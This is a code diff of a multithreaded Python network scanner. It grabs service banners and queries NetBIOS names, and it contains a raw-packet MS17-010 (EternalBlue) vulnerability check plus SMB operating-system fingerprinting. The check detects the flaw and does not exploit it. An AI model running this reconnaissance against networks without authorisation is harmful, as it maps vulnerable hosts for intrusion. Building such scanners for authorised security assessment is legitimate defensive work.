@@ -4,13 +4,45 @@ import ssl
 import socket
 import time
 import threading
-import binascii
 
 
+if sys.version_info[0] == 2:
+    import Queue as queue
+    pass
+if sys.version_info[0] == 3:
+    import queue
+
+global_queue = queue.Queue()
+stop = False
+
+THREAD_COUNT = 256
 DEFAULT_TIMEOUT = 1
 DEFAULT_PORTS = '21-23,25,80,81,110,135,137,139,445,873,1433,1521,3306,3389,6379,7001,8000,8069,8080-8090,9000,9001,10051,11211'
 DEFAULT_UDP_PORTS = '137' # NBNS
 USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'
+
+
+# nbns
+# from https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v%3dtechnet.10)
+UNIQUE_NAMES = {
+    b'\x00': 'Workstation Service',
+    b'\x03': 'Messenger Service',
+    b'\x06': 'RAS Server Service',
+    b'\x1F': 'NetDDE Service',
+    b'\x20': 'Server Service',
+    b'\x21': 'RAS Client Service',
+    b'\xBE': 'Network Monitor Agent',
+    b'\xBF': 'Network Monitor Application',
+    b'\x03': 'Messenger Service',
+    b'\x1D': 'Master Browser',
+    b'\x1B': 'Domain Master Browser',
+}
+GROUP_NAMES = {
+    b'\x00': 'Domain Name',
+    b'\x1C': 'Domain Controllers',
+    b'\x1E': 'Browser Service Elections',
+    # Master Browser
+}
 
 
 socket.setdefaulttimeout(DEFAULT_TIMEOUT)
@@ -53,10 +85,9 @@ def to_ports(raw):
     return ports
 
 
+# TODO use a dict
 def set_data(ip, port, flag):
-    data = b'test_test\r\n'
-
-    # TODO specifc UDP or TCP 
+    data = b'test_test\r\n' 
     if flag == 'U':
         if port == 137:  # NBNS 
             data = b'ff\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00 CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01'
@@ -89,14 +120,23 @@ def check_rep(addr, port, rep, flag):
             # print(num)
             data = rep[57:]
             ret = ''
+            group = ''
+            unique = ''
+            other = ''
+            
             for i in range(num):
-                name = data[18 * i:18 *i + 15].strip().decode()
-                # print(name, data[18 * i + 15:18 *i + 16])
-                # name_flag = data[18 * i + 16:18 *i + 18]
-                if '__MSBROWSE__' not in name and name not in ret:
-                    ret ='\\' + name + ret 
-            return ret[1:]
+                name = data[18 * i:18 *i + 15].decode()
+                flag_bit = bytes(data[18 * i + 15:18 *i + 16])
+                # print(type(flag_bit))
+                if flag_bit in b'\x00':
+                    name_flags = data[18 * i + 16:18 *i + 18]
+                    if ord(name_flags[0:1])>=128:
+                        group = name.strip()
 
+                    else:
+                        unique = name
+            ret = group + '\\' + unique
+            return ret 
         else:
             return rep
     elif flag == 'T':
@@ -118,33 +158,46 @@ def check_rep(addr, port, rep, flag):
         elif port == 445: 
             """
             scan MS17-010 from xunfeng  
+
+            Have bugs in python3
             """
-            negotiate_protocol_request = binascii.unhexlify('00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200')
-            session_setup_request = binascii.unhexlify('00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000')
+            # negotiate_protocol_request = binascii.unhexlify('00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200')
+            negotiate_protocol_request = b'\x00\x00\x00T\xffSMBr\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/K\x00\x00\xc5^\x001\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00'
+            # session_setup_request = binascii.unhexlify('00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000')
+            session_setup_request = b'\x00\x00\x00c\xffSMBs\x00\x00\x00\x00\x18\x01 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/K\x00\x00\xc5^\r\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00&\x00\x00.\x00Windows 2000 2195\x00Windows 2000 5.0\x00'
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(10)
+                s.settimeout(5)
                 s.connect((addr, port))
                 s.send(negotiate_protocol_request)
                 s.recv(1024)
                 s.send(session_setup_request)
                 data = s.recv(1024)
                 user_id = data[32:34]
-                tree_connect_andx_request = '000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00' % ((58 + len(addr)), user_id.encode('hex'), addr.encode('hex'))
-                s.send(binascii.unhexlify(tree_connect_andx_request))
+                tree_connect_andx_request = b'\x00\x00\x00' + chr(58 + len(addr)).encode() + b'\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x4b' + user_id + b'\xc5\x5e\x04\xff\x00\x00\x00\x00\x00\x01\x00\x1a\x00\x00\x5c\x5c' + addr.encode() + b'\x5c\x49\x50\x43\x24\x00\x3f\x3f\x3f\x3f\x3f\x00'
+                s.send(tree_connect_andx_request)
+
+                # tree_connect_andx_request = '000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00' % ((58 + len(addr)), user_id.encode('hex'), addr.encode('hex'))
+                # s.send(binascii.unhexlify(tree_connect_andx_request))
+
+                # print(binascii.unhexlify(tree_connect_andx_request).decode())
                 data = s.recv(1024)
                 allid = data[28:36]
-                payload = '0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00' % allid.encode('hex')
-                s.send(binascii.unhexlify(payload))
+                # payload = '0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00' % allid.encode('hex')
+                # s.send(binascii.unhexlify(payload))
+
+                payload = b'\x00\x00\x00\x4a\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + allid + b'\x10\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00\x02\x00\x23\x00\x00\x00\x07\x00\x5c\x50\x49\x50\x45\x5c\x00'
+                s.send(payload)
+                
                 data = s.recv(1024)
                 s.close()
-                if '\x05\x02\x00\xc0' in data:
+                if b'\x05\x02\x00\xc0' in data:
                     ret += '+Vulnerable+ MS 17-010    '
                 else:
                     ret += 'MS 17-010 No Vulnerability    '
                 s.close()
             except Exception as e:
-                print(e)
+                # print(e, 'MS 17-010')
                 ret += 'MS 17-010 No Vulnerability    '
             try:
                 payload1 = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
@@ -157,14 +210,14 @@ def check_rep(addr, port, rep, flag):
                 # print(s.recv(1024).replace(b'\x00', b'').decode(errors='ignore'))
                 s.send(payload2)
                 data = s.recv(1024)
-                length = ord(data[43]) + ord(data[44]) * 256
+                length = ord(data[43:44]) + ord(data[44:45]) * 256
                 # print(length)
                 data = data[47 + length:]
                 # print(data.decode('UTF-16LE', errors='ignore').replace('\x00', '|'))
-                ret += data.decode('UTF-16LE', errors='ignore').replace('\x00', '|')
+                ret += data.replace(b'\x00\x00', b'|').replace(b'\x00', b'').decode('UTF-8', errors='ignore').replace('\x00', '|')
             except Exception as e:
                 ret += 'Fail to detect OS ...'
-                print(e)
+                print(e, 'smbos')
     
             return ret
 
@@ -178,60 +231,75 @@ def check_rep(addr, port, rep, flag):
         exit()
 
 
-def thread(addr, ports, udp_ports):
-    msg = ''
+def thread(ports, udp_ports):
+    # print(global_queue.qsize())
     # send udp nbns query
-
-    for port in udp_ports:
+    while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            data = set_data(addr, port, 'U')
-            s.sendto(data, (addr, port))
-            rep = s.recv(2000)
-            if rep:
-                rep = check_rep(addr, port, rep, 'U')
-                msg += '  %s' % rep
-        except socket.error as e:
-            pass
+            addr = global_queue.get(timeout=0.01)
+        except:
+            return 
 
-    for port in ports:
-        rep = ''
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((addr, port))
-        except socket.error as e:  # close
-            continue
-        
-        try:
-            msg += '\n   %d   ' %  port
-            data = set_data(addr, port, 'T')  # TODO set data according port num 
-            if port == 443:
-                s = ssl.wrap_socket(s)
-            s.send(data)
+        msg = ''
+        for port in udp_ports:
+            if stop == True:
+                return
 
-            rep = s.recv(2000)
-        except socket.error as e:
-            # print(e)
-            pass
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                data = set_data(addr, port, 'U')
+                s.sendto(data, (addr, port))
+                rep = s.recv(2000)
+                if rep:
+                    rep = check_rep(addr, port, rep, 'U')
+                    msg += '  %s' % rep
+            except socket.error as e:
+                pass
 
-        try:    
-            # msg += banner.replace('\n', '\\n').replace('\r', '\\r') if isinstance(banner, str) else banner.decode('utf-8', errors='replace') # .replace(b'\n', b'\\n').replace(b'\r', b'\\r') # decode and pring banner
-            if isinstance(rep, str):
-                tmp_rep = rep.decode('utf-8', errors='ignore').encode('utf-8').replace('\n', '\\n').replace('\r', '\\r')
-            else:
-                tmp_rep = rep.decode('utf-8', errors='ignore').replace('\n', '\\n').replace('\r', '\\r')
+        for port in ports:
+            if stop == True:
+                return False
 
-            tmp_rep = check_rep(addr, port, tmp_rep, 'T')  # Exception in function ??
-            msg += tmp_rep
-        except Exception as e:
-            print('Encoding error ? ', e)
-            print(addr, port)
-            print(rep)
+            rep = ''
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((addr, port))
+            except socket.error as e:  # close
+                continue
+            
+            try:
+                msg += '\n   %d   ' %  port
+                data = set_data(addr, port, 'T')  # TODO set data according port num 
+                if port == 443:
+                    s = ssl.wrap_socket(s)
+                s.send(data)
 
-    if msg:
-        lock.acquire()
-        print('[*]' + addr + ' ' + msg)
-        lock.release()
+                rep = s.recv(2000)
+            except socket.error as e:
+                # print(e)
+                pass
+
+            try:    
+                # msg += banner.replace('\n', '\\n').replace('\r', '\\r') if isinstance(banner, str) else banner.decode('utf-8', errors='replace') # .replace(b'\n', b'\\n').replace(b'\r', b'\\r') # decode and pring banner
+                if isinstance(rep, str):
+                    if sys.version_info[0] == 2:
+                        tmp_rep = rep.decode('utf-8', errors='ignore').encode('utf-8').replace('\n', '\\n').replace('\r', '\\r')
+                    elif sys.version_info[0] == 3:
+                        tmp_rep = rep.replace('\n', '\\n').replace('\r', '\\r')
+                else:
+                    tmp_rep = rep.decode('utf-8', errors='ignore').replace('\n', '\\n').replace('\r', '\\r')
+
+                tmp_rep = check_rep(addr, port, tmp_rep, 'T')  # Exception in function ??
+                msg += tmp_rep
+            except Exception as e:
+                print('Encoding error ? ', e)
+                print(addr, port)
+                print(rep)
+
+        if msg:
+            lock.acquire()
+            print('[*]' + addr + ' ' + msg)
+            lock.release()
 
 def handle_input():
     if len(sys.argv) != 2 and len(sys.argv) != 3 and len(sys.argv) != 4:
@@ -271,13 +339,23 @@ def handle_input():
 def main():
     hosts, ports, udp_ports = handle_input()
     start = time.time()
-    pool = [ threading.Thread(target=thread, args=(host, ports, udp_ports)) for host in hosts]
+    for host in hosts:
+        global_queue.put(host)
+
+    pool = [ threading.Thread(target=thread, args=(ports, udp_ports)) for i in range(THREAD_COUNT)]
     for t in pool:
         t.start()
-    for t in pool:
-        t.join()
 
-    print('Finish...')
+    try:
+        while threading.active_count() > 1:
+            time.sleep(1)
+            # print(threading.active_count())
+    except KeyboardInterrupt as e:
+        global stop
+        stop = True
+        # print(e)
+
+    print('Waiting stop...')
     print('Cost time: %.2f' % (time.time() - start))
 
 main()
